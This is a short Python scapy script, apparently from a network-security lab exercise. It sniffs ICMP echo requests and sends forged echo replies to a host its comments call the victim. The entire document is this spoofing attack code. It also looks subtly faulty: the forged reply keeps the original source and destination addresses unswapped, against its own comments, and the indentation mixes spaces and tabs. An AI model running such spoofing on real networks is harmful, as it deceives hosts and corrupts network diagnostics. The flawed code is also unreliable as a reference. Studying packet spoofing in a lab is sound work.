from scapy.all import *

## Custom packet function
def custom_callback(packet):

 if packet[ICMP].type == 8: # checks if the ICMP is an echo request
	dest = str(packet[IP].dst) # gets the destination IP 
	source = str(packet[IP].src) # source because src is already taken
	identify = packet[ICMP].id # gets id field of ICMP
	sequence = packet[ICMP].seq # gets sequence number field of ICMP
	payload = packet[ICMP].payload # gets the payload of the ICMP packet
	cde = packet[ICMP].code # gets code parameter of the ICMP packet
	reply = (IP(src = source, dst = dest)/ICMP(type = 'echo-reply', id = identify, seq = sequence, code=cde)/Raw(load = payload)) # constructed packet reply for victim
	send(reply) # sends the echo reply of the spoofed address to the victim
	reply.show() # echo-reply shows on victim's terminal

## Sniffing function
sniff(filter="icmp", prn=custom_callback, store=0) # looks for ICMP packets and prn will return a packet based on what was sniffed 
